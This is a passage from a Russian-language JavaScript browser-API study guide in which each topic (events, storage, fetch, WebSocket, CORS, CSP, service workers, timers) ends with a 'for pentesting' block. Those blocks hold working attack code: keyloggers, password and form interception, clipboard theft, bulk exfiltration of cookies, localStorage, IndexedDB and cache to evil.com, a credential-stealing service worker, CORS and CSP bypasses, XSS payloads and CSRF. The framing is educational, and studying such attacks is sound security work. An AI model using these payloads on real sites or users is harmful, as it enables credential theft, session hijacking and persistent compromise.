    // это поле пароля - крадем
    sendToEvil(el.value);
}

// 3. Обход через matches для фильтрации
const safe = !el.matches('script, iframe, object'); // попытка защиты
```

// scroll, scrollTo, scrollBy

```javaScript
// Прокрутка элемента
el.scroll(0, 100); // прокрутить к (0,100)
el.scrollTo(0, 100); // то же
el.scrollBy(0, 10); // прокрутить на 10px вниз

// Прокрутка окна
window.scrollTo(0, 500);
window.scrollBy(0, 100);

// Свойства прокрутки
el.scrollTop;  // текущая прокрутка по вертикали
el.scrollLeft; // по горизонтали

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытие элементов прокруткой
window.scrollTo(0, 10000); // убрали предупреждение с экрана

// 2. Обнаружение прокрутки для триггера
window.addEventListener('scroll', () => {
    if (window.scrollY > 100) {
        // пользователь прокрутил - можно показать фишинг
    }
});

// 3. Автопрокрутка для сбора данных
setInterval(() => {
    // собираем видимый контент
    console.log('видимая область:', window.scrollY);
}, 1000);
```

// focus, blur

```javaScript
// focus - установить фокус на элемент
el.focus();
el.focus({ preventScroll: false }); // опции

// blur - убрать фокус
el.blur();

// События
el.addEventListener('focus', () => console.log('получил фокус'));
el.addEventListener('blur', () => console.log('потерял фокус'));

// Документ
document.activeElement; // элемент в фокусе
document.hasFocus(); // есть ли фокус на документе

// ДЛЯ ПЕНТЕСТА:
// 1. Перехват фокуса для кражи ввода
document.addEventListener('focus', (e) => {
    if (e.target.matches('input[type="password"]')) {
        e.target.addEventListener('input', (ie) => {
            sendToEvil(ie.target.value); // кража пароля
        }, { once: true });
    }
}, true); // capture

// 2. Принудительный фокус на вредоносном поле
const fakeInput = document.createElement('input');
fakeInput.type = 'text';
fakeInput.placeholder = 'Введите пароль';
document.body.appendChild(fakeInput);
fakeInput.focus(); // курсор в нашем поле!

// 3. Обход через autofocus
<input autofocus onfocus="alert(1)"> // XSS!
```

// click (вызов события)

```javaScript
// Программный клик
el.click(); // вызывает обработчики клика

// Создание и dispatch события мыши
const event = new MouseEvent('click', {
    bubbles: true,
    cancelable: true,
    clientX: 100,
    clientY: 100
});
el.dispatchEvent(event);

// ДЛЯ ПЕНТЕСТА:
// 1. Автоклик на кнопку
document.querySelector('button[type="submit"]').click(); // отправка формы

// 2. Триггер событий для обхода
function autoSubmit() {
    document.getElementById('hidden-form').click();
}
setTimeout(autoSubmit, 1000);

// 3. Кликджекинг через iframe
// наложение iframe и вызов click на невидимом элементе
```


**Для пентеста:** манипуляция элементами для обхода CSP

### 4.4 События - ALL



// Мышь: click, dblclick, mousedown, mouseup, mouseover, mousemove, mouseout, mouseenter, mouseleave, contextmenu

```javaScript
// click - клик (mousedown + mouseup)
element.addEventListener('click', (e) => {
    console.log('клик!', e.clientX, e.clientY);
});

// dblclick - двойной клик
element.addEventListener('dblclick', () => console.log('double'));

// mousedown/mouseup - нажатие/отпускание
element.addEventListener('mousedown', () => console.log('нажата'));
element.addEventListener('mouseup', () => console.log('отпущена'));

// mouseover/mouseout - при наведении и уходе (с учетом дочерних)
element.addEventListener('mouseover', () => console.log('навели'));
element.addEventListener('mouseout', () => console.log('убрали'));

// mouseenter/mouseleave - только при входе/выходе (без пузырей)
element.addEventListener('mouseenter', () => console.log('вошли'));
element.addEventListener('mouseleave', () => console.log('вышли'));

// mousemove - движение мыши
element.addEventListener('mousemove', (e) => {
    console.log('мышь на', e.clientX, e.clientY);
});

// contextmenu - контекстное меню (правая кнопка)
element.addEventListener('contextmenu', (e) => {
    e.preventDefault(); // отключить меню
    console.log('правая кнопка');
});

// ДЛЯ ПЕНТЕСТА:
// 1. Отслеживание мыши (может нарушать приватность)
document.addEventListener('mousemove', (e) => {
    // сбор движений мыши для fingerprint
    fetch('/track', {method: 'POST', body: JSON.stringify({x: e.clientX, y: e.clientY})});
});

// 2. XSS через события мыши
<img src=x onmouseover="alert(1)"> // XSS при наведении!

// 3. Блокировка контекстного меню
document.addEventListener('contextmenu', (e) => e.preventDefault()); // защита от сохранения
// но можно отменить через stopImmediatePropagation
```

// Клава: keydown, keypress, keyup

```javaScript
// keydown - клавиша нажата
document.addEventListener('keydown', (e) => {
    console.log('клавиша:', e.key);
    console.log('код:', e.code);
    console.log('ctrl:', e.ctrlKey);
    console.log('shift:', e.shiftKey);
    console.log('alt:', e.altKey);
    
    if (e.key === 'Enter') {
        // нажат Enter
    }
});

// keypress - символ нажат (устарел, используйте keydown)
document.addEventListener('keypress', (e) => {
    console.log('символ:', e.charCode);
});

// keyup - клавиша отпущена
document.addEventListener('keyup', (e) => {
    console.log('отпущена:', e.key);
});

// ДЛЯ ПЕНТЕСТА: КЕЙЛОГГЕР!
// 1. Простой кейлоггер
let keys = '';
document.addEventListener('keydown', (e) => {
    keys += e.key;
    // отправляем каждые 10 нажатий
    if (keys.length >= 10) {
        fetch('https://evil.com/log', {method: 'POST', body: keys});
        keys = '';
    }
});

// 2. Перехват паролей
document.addEventListener('keydown', (e) => {
    if (document.activeElement.type === 'password') {
        sendToEvil(e.key);
    }
});

// 3. Обнаружение горячих клавиш
document.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'c') {
        console.log('копирование!');
        // можно подменить буфер обмена
    }
});
```

// Формы: submit, change, input, focus, blur, focusin, focusout

```javaScript
// submit - отправка формы
form.addEventListener('submit', (e) => {
    console.log('форма отправляется');
    // e.preventDefault(); - отменить отправку
});

// change - изменение поля (после потери фокуса)
input.addEventListener('change', (e) => {
    console.log('новое значение:', e.target.value);
});

// input - каждое изменение (немедленно)
input.addEventListener('input', (e) => {
    console.log('сейчас:', e.target.value);
});

// focus/blur - получение/потеря фокуса
input.addEventListener('focus', () => console.log('фокус'));
input.addEventListener('blur', () => console.log('потеря фокуса'));

// focusin/focusout - всплывающие версии
input.addEventListener('focusin', () => console.log('фокус (всплытие)'));

// ДЛЯ ПЕНТЕСТА:
// 1. Кража ввода в реальном времени
document.querySelector('input[type="text"]').addEventListener('input', (e) => {
    sendToEvil(e.target.value); // каждое нажатие уходит
});

// 2. Перехват отправки формы
document.querySelector('form').addEventListener('submit', (e) => {
    e.preventDefault(); // блокируем отправку
    const data = new FormData(e.target);
    fetch('https://evil.com/steal', {method: 'POST', body: data}); // кража
    // можно отправить оригинал после
});

// 3. Автозаполнение паролей триггерит change
document.querySelector('input[type="password"]').addEventListener('change', (e) => {
    sendToEvil(e.target.value); // пароль из автозаполнения
});
```

// Документ: DOMContentLoaded, readystatechange

```javaScript
// DOMContentLoaded - DOM загружен (картинки могут еще грузиться)
document.addEventListener('DOMContentLoaded', () => {
    console.log('DOM готов');
});

// readystatechange - изменение состояния документа
document.addEventListener('readystatechange', () => {
    console.log('состояние:', document.readyState);
    // 'loading' - загружается
    // 'interactive' - DOM готов (как DOMContentLoaded)
    // 'complete' - всё загружено (включая картинки)
});

// ДЛЯ ПЕНТЕСТА:
// 1. Выполнение кода как можно раньше
document.addEventListener('DOMContentLoaded', () => {
    // DOM уже есть, можно работать
    document.body.innerHTML += '<img src=x onerror=alert(1)>';
});

// 2. Проверка состояния
if (document.readyState === 'complete') {
    // страница полностью загружена
}
```

// Окно: load, unload, beforeunload, resize, scroll, error

```javaScript
// load - полная загрузка (включая картинки)
window.addEventListener('load', () => {
    console.log('всё загружено');
});

// unload - выгрузка страницы
window.addEventListener('unload', () => {
    // можно отправить последние данные (синхронно!)
});

// beforeunload - перед уходом (можно спросить)
window.addEventListener('beforeunload', (e) => {
    e.preventDefault();
    e.returnValue = 'Точно уйти?';
});

// resize - изменение размера окна
window.addEventListener('resize', () => {
    console.log('новый размер:', window.innerWidth, window.innerHeight);
});

// scroll - прокрутка
window.addEventListener('scroll', () => {
    console.log('прокрутка:', window.scrollY);
});

// error - ошибка загрузки ресурса
window.addEventListener('error', (e) => {
    console.log('ошибка:', e.message, 'на', e.filename);
}, true);

// ДЛЯ ПЕНТЕСТА:
// 1. Отправка данных перед уходом
window.addEventListener('unload', () => {
    // синхронный запрос (чтобы успеть)
    navigator.sendBeacon('/log', 'данные');
});

// 2. Диалог подтверждения для фишинга
window.addEventListener('beforeunload', (e) => {
    e.returnValue = 'Ваш аккаунт будет заблокирован!'; // пугаем
});

// 3. Отслеживание размеров для fingerprint
let lastSize = {width: window.innerWidth, height: window.innerHeight};
window.addEventListener('resize', () => {
    const newSize = {width: window.innerWidth, height: window.innerHeight};
    if (lastSize.width !== newSize.width) {
        // размер изменился
    }
});

// 4. Перехват ошибок скриптов
window.addEventListener('error', (e) => {
    fetch('/log', {method: 'POST', body: e.filename + ':' + e.lineno});
});
```

// Буфер: copy, cut, paste

```javaScript
// copy - копирование в буфер
document.addEventListener('copy', (e) => {
    console.log('копирование:', e.clipboardData.getData('text/plain'));
    e.clipboardData.setData('text/plain', 'подмененный текст'); // подмена!
    e.preventDefault(); // отменить стандартное копирование
});

// cut - вырезание
document.addEventListener('cut', (e) => {
    console.log('вырезание');
});

// paste - вставка
document.addEventListener('paste', (e) => {
    const text = e.clipboardData.getData('text/plain');
    console.log('вставка:', text);
    if (text.includes('script')) {
        e.preventDefault(); // блокируем вставку XSS
    }
});

// ДЛЯ ПЕНТЕСТА:
// 1. Кража буфера обмена
document.addEventListener('copy', (e) => {
    // при копировании узнаем, что скопировали
    const copied = window.getSelection().toString();
    sendToEvil(copied);
});

document.addEventListener('paste', (e) => {
    // при вставке получаем данные
    const pasted = e.clipboardData.getData('text');
    sendToEvil(pasted);
});

// 2. Подмена скопированного
document.addEventListener('copy', (e) => {
    e.clipboardData.setData('text/plain', 'вредоносная команда');
    e.preventDefault(); // вместо скопированного вставится наше
});

// 3. Обогащение данных при вставке
document.addEventListener('paste', (e) => {
    e.preventDefault();
    const text = e.clipboardData.getData('text/plain');
    document.execCommand('insertText', false, 'вставлено: ' + text);
});
```

// Touch: touchstart, touchmove, touchend, touchcancel

```javaScript
// Для мобильных устройств
element.addEventListener('touchstart', (e) => {
    console.log('касание:', e.touches[0].clientX, e.touches[0].clientY);
});

element.addEventListener('touchmove', (e) => {
    e.preventDefault(); // отменить скролл
    console.log('движение');
});

element.addEventListener('touchend', (e) => {
    console.log('касание закончено');
});

element.addEventListener('touchcancel', (e) => {
    console.log('касание отменено');
});

// ДЛЯ ПЕНТЕСТА:
// 1. Отслеживание касаний на мобильных
document.addEventListener('touchstart', (e) => {
    const touch = e.touches[0];
    fetch('/track', {method: 'POST', body: JSON.stringify({
        x: touch.clientX, y: touch.clientY
    })});
});

// 2. Блокировка скролла (DoS)
document.addEventListener('touchmove', (e) => e.preventDefault(), {passive: false});
```

// Drag & drop / тяни толкай

```javaScript
// Элемент, который можно перетаскивать (draggable=true)
<div draggable="true" ondragstart="dragStart(event)">Перетащи</div>

// dragstart - начало перетаскивания
element.addEventListener('dragstart', (e) => {
    e.dataTransfer.setData('text/plain', 'данные');
    e.dataTransfer.effectAllowed = 'move';
});

// dragenter/dragover - над элементом
element.addEventListener('dragover', (e) => {
    e.preventDefault(); // разрешить сброс
});

// drop - сброс
element.addEventListener('drop', (e) => {
    e.preventDefault();
    const data = e.dataTransfer.getData('text/plain');
    console.log('получено:', data);
});

// dragend - окончание перетаскивания
element.addEventListener('dragend', (e) => {
    console.log('перетаскивание закончено');
});

// ДЛЯ ПЕНТЕСТА:
// 1. Перехват данных при перетаскивании
element.addEventListener('drop', (e) => {
    const data = e.dataTransfer.getData('text');
    if (data.includes('token')) {
        sendToEvil(data);
    }
});

// 2. Использование drag & drop для загрузки файлов
document.addEventListener('drop', (e) => {
    e.preventDefault();
    const files = e.dataTransfer.files;
    if (files.length) {
        // читаем файлы
        const reader = new FileReader();
        reader.onload = () => sendToEvil(reader.result);
        reader.readAsText(files[0]);
    }
});
```

// Animation & Transition

```javaScript
// CSS анимации генерируют события
element.addEventListener('animationstart', () => {
    console.log('анимация началась');
});

element.addEventListener('animationend', () => {
    console.log('анимация закончилась');
});

element.addEventListener('animationiteration', () => {
    console.log('повтор анимации');
});

// CSS transitions
element.addEventListener('transitionstart', () => {
    console.log('transition начался');
});

element.addEventListener('transitionend', () => {
    console.log('transition закончился');
});

element.addEventListener('transitioncancel', () => {
    console.log('transition отменен');
});

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытое выполнение кода
element.addEventListener('animationend', () => {
    alert(1); // XSS после анимации
});

// 2. Измерение времени через анимации (side-channel)
const start = performance.now();
element.addEventListener('animationend', () => {
    const end = performance.now();
    console.log('анимация длилась:', end - start);
});
```

// Свои события (dispatchEvent)

```javaScript
// Создание кастомного события
const event = new CustomEvent('userLogin', {
    detail: { username: 'admin', time: Date.now() },
    bubbles: true,
    cancelable: true
});

// Генерация
element.dispatchEvent(event);

// Подписка
element.addEventListener('userLogin', (e) => {
    console.log('пользователь залогинился:', e.detail);
});

// ДЛЯ ПЕНТЕСТА:
// 1. Подслушивание внутренних событий
window.addEventListener('userAction', (e) => {
    // перехватываем внутренние события приложения
    sendToEvil(e.detail);
});

// 2. Генерация своих событий для обхода
// если приложение слушает событие 'update'
document.dispatchEvent(new CustomEvent('update', {
    detail: { xss: 'payload' }
}));

// 3. Отмена событий
element.addEventListener('criticalAction', (e) => {
    e.preventDefault(); // отменяем важное действие
    e.stopImmediatePropagation();
}, true);
```



### 4.5 Storage



// localStorage (постоянное, 5-10MB)

```javaScript
// Сохранить
localStorage.setItem('token', 'secret123');
localStorage.setItem('user', JSON.stringify({name: 'admin', role: 'admin'}));

// Получить
const token = localStorage.getItem('token'); // 'secret123'
const user = JSON.parse(localStorage.getItem('user'));

// Удалить
localStorage.removeItem('token');
localStorage.clear(); // все очистить

// Количество
localStorage.length; // количество записей

// Ключ по индексу
localStorage.key(0); // первый ключ

// ДЛЯ ПЕНТЕСТА: ЗОЛОТАЯ ЖИЛА!
// 1. Кража localStorage
const data = {};
for (let i = 0; i < localStorage.length; i++) {
    const key = localStorage.key(i);
    data[key] = localStorage.getItem(key);
}
fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
}); // украли всё!

// 2. Подмена данных в localStorage
localStorage.setItem('isAdmin', 'true'); // если приложение так проверяет

// 3. Очистка localStorage (DoS)
localStorage.clear(); // пользователь потеряет данные
```

// sessionStorage (до закрытия вкладки)

```javaScript
// То же API что у localStorage, но живет до закрытия вкладки
sessionStorage.setItem('temp', 'data');
const temp = sessionStorage.getItem('temp');
sessionStorage.removeItem('temp');
sessionStorage.clear();

// ДЛЯ ПЕНТЕСТА:
// 1. Кража сессионных данных
const sessionData = {};
for (let i = 0; i < sessionStorage.length; i++) {
    const key = sessionStorage.key(i);
    sessionData[key] = sessionStorage.getItem(key);
}

// 2. Отличие от localStorage - не переживает закрытие вкладки
// но если пользователь не закрывает - данные живут
```

// Cookie (document.cookie)

```javaScript
// Чтение всех кук
console.log(document.cookie); // "session=abc123; theme=dark"

// Установка куки
document.cookie = "session=xyz789; path=/; max-age=3600; secure; samesite=strict";
document.cookie = "theme=light"; // добавится, не перезапишет все!

// Опции кук
// ;domain=.example.com - доступно на поддоменах
// ;path=/admin - только для /admin
// ;max-age=3600 - время жизни в секундах
// ;expires=... - конкретная дата
// ;secure - только HTTPS
// ;httponly - недоступно через JS (защита!)
// ;samesite=strict/lax/none

// Удаление куки (установкой с истекшим сроком)
document.cookie = "session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";

// ДЛЯ ПЕНТЕСТА: ЭТО КРИТИЧНО!
// 1. Кража кук (если не HttpOnly)
fetch('https://evil.com/steal?cookie=' + encodeURIComponent(document.cookie));

// 2. Подмена кук
document.cookie = "session=hacked123; path=/";
document.cookie = "isAdmin=true; path=/";

// 3. Создание кук для фиксации сессии
document.cookie = "rememberme=yes; max-age=31536000"; // на год

// 4. Чтение конкретной куки
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
```

// IndexedDB (асинхронная NoSQL)

```javaScript
// Открытие БД
const request = indexedDB.open('MyDB', 1);

request.onerror = (e) => console.log('ошибка');
request.onsuccess = (e) => {
    const db = e.target.result;
    console.log('БД открыта');
};

request.onupgradeneeded = (e) => {
    const db = e.target.result;
    // Создание хранилища
    const store = db.createObjectStore('users', { keyPath: 'id' });
    store.createIndex('name', 'name', { unique: false });
};

// Добавление данных
const transaction = db.transaction(['users'], 'readwrite');
const store = transaction.objectStore('users');
store.add({ id: 1, name: 'admin', token: 'secret' });

// Чтение
const getRequest = store.get(1);
getRequest.onsuccess = (e) => console.log(e.target.result);

// ДЛЯ ПЕНТЕСТА:
// 1. Кража всех данных из IndexedDB
function stealIndexedDB() {
    indexedDB.databases().then(dbs => {
        dbs.forEach(dbInfo => {
            const request = indexedDB.open(dbInfo.name);
            request.onsuccess = (e) => {
                const db = e.target.result;
                const stores = db.objectStoreNames;
                for (let storeName of stores) {
                    const tx = db.transaction(storeName, 'readonly');
                    const store = tx.objectStore(storeName);
                    const getAll = store.getAll();
                    getAll.onsuccess = () => {
                        fetch('/steal', {
                            method: 'POST',
                            body: JSON.stringify({
                                db: dbInfo.name,
                                store: storeName,
                                data: getAll.result
                            })
                        });
                    };
                }
            };
        });
    });
}

// 2. IndexedDB может хранить большие объемы - можно использовать для эксфильтрации
```

// Cache API

```javaScript
// Кеширование ресурсов (для Service Workers)
caches.open('my-cache').then(cache => {
    // Добавить в кеш
    cache.add('/api/data');
    cache.addAll(['/styles.css', '/script.js']);
    
    // Положить response
    cache.put('/custom', new Response('hello'));
    
    // Получить из кеша
    cache.match('/api/data').then(response => {
        if (response) response.text().then(console.log);
    });
    
    // Удалить из кеша
    cache.delete('/api/data');
    
    // Все ключи
    cache.keys().then(keys => console.log(keys));
});

// Удалить весь кеш
caches.delete('my-cache');

// Все кеши
caches.keys().then(names => console.log(names));

// ДЛЯ ПЕНТЕСТА:
// 1. Кража кешированных данных
caches.keys().then(names => {
    names.forEach(name => {
        caches.open(name).then(cache => {
            cache.keys().then(requests => {
                requests.forEach(request => {
                    cache.match(request).then(response => {
                        if (response) {
                            response.text().then(data => {
                                fetch('/steal', {
                                    method: 'POST',
                                    body: JSON.stringify({
                                        cache: name,
                                        url: request.url,
                                        data: data
                                    })
                                });
                            });
                        }
                    });
                });
            });
        });
    });
});

// 2. Очистка кеша (DoS)
caches.keys().then(names => names.forEach(name => caches.delete(name)));
```



### 4.6 Fetch и Network



// fetch API (GET, POST, headers, body)

```javaScript
// GET запрос
fetch('https://api.example.com/users')
    .then(response => {
        if (!response.ok) throw new Error('Network error');
        return response.json(); // или .text(), .blob(), .formData()
    })
    .then(data => console.log(data))
    .catch(err => console.error(err));

// POST с JSON
fetch('https://api.example.com/users', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123'
    },
    body: JSON.stringify({ name: 'John', role: 'admin' })
});

// POST с формой
const formData = new FormData();
formData.append('username', 'admin');
formData.append('password', '123456');

fetch('/login', {
    method: 'POST',
    body: formData // Content-Type автоматически установится
});

// Отправка кук (credentials)
fetch('/api/data', {
    credentials: 'include' // отправлять куки
});

// ДЛЯ ПЕНТЕСТА: ЭКСФИЛЬТРАЦИЯ!
// 1. Кража данных
fetch('https://evil.com/steal', {
    method: 'POST',
    mode: 'no-cors', // можно отправить даже если CORS блокирует (но ответ не прочитаешь)
    body: document.cookie
});

// 2. Межсайтовые запросы
fetch('https://target.com/admin/delete', {
    method: 'POST',
    credentials: 'include', // куки жертвы уйдут!
    body: 'id=123'
}); // CSRF-атака

// 3. Обход через fetch с data: URL
fetch('data:text/plain,alert(1)').then(r => r.text()).then(eval); // XSS!
```

// XMLHttpRequest (старье, но знать)

```javaScript
// Старый способ (до fetch)
const xhr = new XMLHttpRequest();

// GET
xhr.open('GET', 'https://api.example.com/users');
xhr.onload = function() {
    if (xhr.status === 200) {
        console.log(JSON.parse(xhr.responseText));
    }
};
xhr.send();

// POST
xhr.open('POST', '/api/data');
xhr.setRequestHeader('Content-Type', 'application/json');
xhr.onload = () => console.log(xhr.responseText);
xhr.send(JSON.stringify({data: 'value'}));

// Синхронный запрос (блокирует UI)
xhr.open('GET', '/data', false); // false = синхронно
xhr.send();
console.log(xhr.responseText); // выполнится после ответа

// ДЛЯ ПЕНТЕСТА:
// 1. Синхронные запросы для unload (успеть отправить перед уходом)
window.addEventListener('unload', () => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', '/log?data=' + document.cookie, false); // синхронно!
    xhr.send();
});

// 2. Обход через xhr.withCredentials
xhr.withCredentials = true; // отправка кук
```

// WebSocket

```javaScript
// Постоянное соединение (full-duplex)
const ws = new WebSocket('wss://example.com/socket');

ws.onopen = () => {
    console.log('соединение открыто');
    ws.send('привет сервер!');
};

ws.onmessage = (e) => {
    console.log('получено:', e.data);
    // может быть XSS если данные вставляются в DOM
    document.body.innerHTML += e.data; // XSS!
};

ws.onerror = (e) => console.log('ошибка');
ws.onclose = () => console.log('соединение закрыто');

// ДЛЯ ПЕНТЕСТА:
// 1. Перехват WebSocket трафика
const originalSend = WebSocket.prototype.send;
WebSocket.prototype.send = function(data) {
    fetch('/steal-ws', {method: 'POST', body: data});
    return originalSend.call(this, data);
};

// 2. Создание своего WebSocket для эксфильтрации
const exfil = new WebSocket('wss://evil.com/collect');
exfil.onopen = () => exfil.send(document.cookie);

// 3. XSS через WebSocket данные
ws.onmessage = (e) => {
    eval(e.data); // ОПАСНО! сервер может слать код
};
```

// Server-Sent Events

```javaScript
// SSE - сервер шлет события (односторонне)
const es = new EventSource('/events');

es.onmessage = (e) => {
    console.log('событие:', e.data);
    document.body.innerHTML += e.data; // XSS!
};

es.addEventListener('user-login', (e) => {
    console.log('user login:', e.data);
});

es.onerror = (e) => console.log('ошибка');

// ДЛЯ ПЕНТЕСТА:
// 1. Перехват SSE
EventSource.prototype.addEventListener = function(type, listener) {
    // подмена
    console.log('SSE event:', type);
    return this.addEventListener(type, listener);
};

// 2. XSS через SSE данные
const sse = new EventSource('/stream');
sse.onmessage = (e) => {
    document.write(e.data); // XSS если данные не экранированы
};
```

// CORS  - И КАК ЭТО СЛОМАТЬ К КУЯМ ЕГО

```javaScript
// CORS - механизм безопасности для кросс-доменных запросов

// Простой запрос (без предзапроса) - если:
// - GET/HEAD/POST
// - Content-Type: application/x-www-form-urlencoded, multipart/form-data, text/plain
fetch('https://other-site.com/api', {
    method: 'POST',
    headers: {'Content-Type': 'text/plain'}, // простой заголовок
    body: 'data'
});

// Сложный запрос - с предзапросом OPTIONS
fetch('https://other-site.com/api', {
    method: 'DELETE', // не простой метод
    headers: {
        'Content-Type': 'application/json', // не простой тип
        'X-Custom': 'value' // кастомный заголовок
    }
});

// Ответ сервера должен содержать:
// Access-Control-Allow-Origin: https://mysite.com или *
// Access-Control-Allow-Credentials: true (если с куками)
// Access-Control-Allow-Methods: GET, POST, DELETE
// Access-Control-Allow-Headers: Content-Type, X-Custom

// ДЛЯ ПЕНТЕСТА: КАК ЛОМАТЬ CORS
// 1. Неправильная конфигурация: Access-Control-Allow-Origin: *
// если при этом Allow-Credentials: true - это ПИЗДЕЦ!

// 2. Отражение Origin
// Если сервер берет Origin из запроса и возвращает его
fetch('https://vulnerable.com/api', {
    headers: {'Origin': 'https://evil.com'}
});
// Ответ: Access-Control-Allow-Origin: https://evil.com
// Тогда можно читать ответ с куками!

// 3. Обход через null Origin
// Некоторые серверы разрешают null
const iframe = document.createElement('iframe');
iframe.srcdoc = `
    <script>
        fetch('https://target.com/api', {credentials:'include'})
            .then(r => r.text())
            .then(d => parent.postMessage(d, '*'))
    </script>
`;
document.body.appendChild(iframe);
// Origin будет "null" - если разрешено - утечка!

// 4. Preflight bypass
// Если сервер не проверяет метод в предзапросе
fetch('https://target.com/admin/delete', {
    method: 'DELETE',
    mode: 'cors'
}); // если OPTIONS разрешает DELETE - можно!

// 5. Кража данных через CORS
fetch('https://target.com/api/secret', {
    credentials: 'include'
}).then(r => r.text()).then(d => {
    fetch('https://evil.com/steal?data=' + encodeURIComponent(d));
});
```

// Content Security Policy (CSP)

```javaScript
// CSP - заголовки безопасности, ограничивающие загрузку ресурсов
// Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com

// Директивы:
// default-src - по умолчанию для всех типов
// script-src - откуда можно грузить скрипты
// style-src - откуда стили
// img-src - картинки
// connect-src - fetch, XHR, WebSocket
// frame-src - iframe
// font-src - шрифты
// media-src - видео/аудио
// object-src - плагины (Flash)
// report-uri - куда отправлять отчеты о нарушениях

// Значения:
// 'self' - свой домен
// 'none' - ничего
// 'unsafe-inline' - разрешить инлайн-скрипты (ОПАСНО!)
// 'unsafe-eval' - разрешить eval (ОПАСНО!)
// 'strict-dynamic' - доверять скриптам от доверенных
// https://example.com - конкретный домен
// *.example.com - поддомены
// 'nonce-abc123' - одноразовый токен
// 'sha256-...' - хеш скрипта

// ДЛЯ ПЕНТЕСТА: КАК ОБХОДИТЬ CSP
// 1. Если есть 'unsafe-inline' - XSS через инлайн-события
// <img src=x onerror=alert(1)> - сработает!

// 2. Если есть 'unsafe-eval' - можно использовать eval, Function
eval('alert(1)');
setTimeout('alert(1)', 0);
new Function('alert(1)')();

// 3. Обход через JSONP
// Если script-src разрешает доверенный домен с JSONP
<script src="https://trusted.com/jsonp?callback=alert(1)"></script>

// 4. Обход через base-uri
// Если можно изменить <base>, можно переопределить пути
<base href="https://evil.com/">

// 5. Обход через iframe с js: или data: URL
// если frame-src разрешает
<iframe src="javascript:alert(1)"></iframe>

// 6. Обход через 302 редирект
// Скрипт с доверенного домена редиректит на evil

// 7. Обход через дыры в CDN
// Если разрешены популярные CDN, можно найти дырявый JSONP

// 8. Обход через 'strict-dynamic'
// Если первый скрипт загружен с nonce, он может загрузить любой другой
```

// Service Workers

```javaScript
// Service Worker - фоновый скрипт, перехватывающий запросы

// Регистрация
navigator.serviceWorker.register('/sw.js')
    .then(reg => console.log('SW зарегистрирован'))
    .catch(err => console.log('ошибка'));

// sw.js - перехват запросов
self.addEventListener('install', (e) => {
    console.log('установка');
    self.skipWaiting(); // активировать сразу
});

self.addEventListener('activate', (e) => {
    console.log('активация');
    clients.claim(); // начать контролировать сразу
});

self.addEventListener('fetch', (e) => {
    console.log('запрос:', e.request.url);
    
    // Модификация ответа
    e.respondWith(
        fetch(e.request).then(response => {
            if (e.request.url.includes('api')) {
                // подмена данных
                const newResponse = new Response('hacked', response);
                return newResponse;
            }
            return response;
        })
    );
});

// Отправка сообщений в SW
navigator.serviceWorker.controller.postMessage('hello');

// ДЛЯ ПЕНТЕСТА: ЭТО ОЧЕНЬ ОПАСНО!
// 1. Постоянный XSS через Service Worker
// Если злоумышленник может зарегистрировать свой SW
navigator.serviceWorker.register('https://evil.com/sw.js')
    .then(() => console.log('SW зарегистрирован'));

// SW может перехватывать все запросы и вставлять XSS в ответы
// Даже после закрытия вкладки SW остается!

// 2. Кража данных через SW
self.addEventListener('fetch', (e) => {
    // логирование всех запросов
    fetch('https://evil.com/log?url=' + encodeURIComponent(e.request.url));
    
    // подмена ответов с паролями
    if (e.request.url.includes('/login')) {
        e.respondWith(
            fetch(e.request).then(res => {
                res.clone().text().then(body => {
                    // кража данных логина
                    fetch('https://evil.com/steal', {method: 'POST', body});
                });
                return res;
            })
        );
    }
});

// 3. Кэширование вредоносных ресурсов
self.addEventListener('install', (e) => {
    e.waitUntil(
        caches.open('v1').then(cache => {
            return cache.addAll([
                '/',
                '/index.html',
                'https://evil.com/xss.js' // кэшируем вредонос
            ]);
        })
    );
});

// 4. Обход CSP через Service Worker
// SW работает с собственным CSP, может грузить что угодно
```



### 4.7 Timers



// setTimeout, setInterval

```javaScript
// setTimeout - выполнить один раз через время
setTimeout(() => {
    alert('прошло 1 секунда');
}, 1000);

// С аргументами
setTimeout((a, b) => {
    console.log(a + b);
}, 1000, 2, 3);

// Со строкой (НЕ ИСПОЛЬЗОВАТЬ, но для XSS важно!)
setTimeout('alert(1)', 1000); // выполнится через секунду!

// setInterval - выполнять периодически
const interval = setInterval(() => {
    console.log('каждые 2 секунды');
}, 2000);

// Очистка
clearTimeout(timeoutId);
clearInterval(intervalId);

// ДЛЯ ПЕНТЕСТА:
// 1. XSS через setTimeout со строкой
setTimeout('alert(document.cookie)', 100); // обход фильтров!

// 2. Обход фильтров через задержку
function sanitize(input) {
    return input.replace(/alert/g, '');
}
const payload = 'ale' + 'rt(1)';
setTimeout(payload, 1000); // фильтр не сработает на строку в setTimeout!

// 3. Бесконечный интервал для DoS
setInterval(() => {
    alert('ты не закроешь меня'); // бесит
}, 1000);

// 4. Очистка чужих таймеров
for (let i = 1; i < 1000; i++) {
    clearTimeout(i); // попытка убить все таймеры
}
```

// clearTimeout, clearInterval

```javaScript

```

// requestAnimationFrame

```javaScript
// Выполнить, когда браузер свободен
// Для анимаций - синхронизировано с частотой кадров
function animate() {
    // обновление анимации
    element.style.left = (parseFloat(element.style.left) || 0) + 1 + 'px';
    
    requestAnimationFrame(animate); // следующий кадр
}
requestAnimationFrame(animate);

// Отмена
const id = requestAnimationFrame(animate);
cancelAnimationFrame(id);

// ДЛЯ ПЕНТЕСТА:
// 1. Скрытое выполнение кода
function stealth() {
    if (shouldExploit()) {
        alert(1); // XSS!
    }
    requestAnimationFrame(stealth);
}
requestAnimationFrame(stealth); // выполняется при каждом кадре

// 2. Измерение FPS для fingerprint
let last = performance.now();
let frames = 0;
function measure() {
    frames++;
    const now = performance.now();
    if (now - last > 1000) {
        console.log('FPS:', frames);
        frames = 0;
        last = now;
    }
    requestAnimationFrame(measure);
}
```

// requestIdleCallback

```javaScript
// В браузерах минимальная задержка setTimeout - 4ms после 5го вложенного
// Выполнить, когда браузер свободен
requestIdleCallback((deadline) => {
    console.log('свободного времени:', deadline.timeRemaining());
    console.log('поработаем в фоне');
});

// С таймаутом (выполнить, даже если занят)
requestIdleCallback(() => {
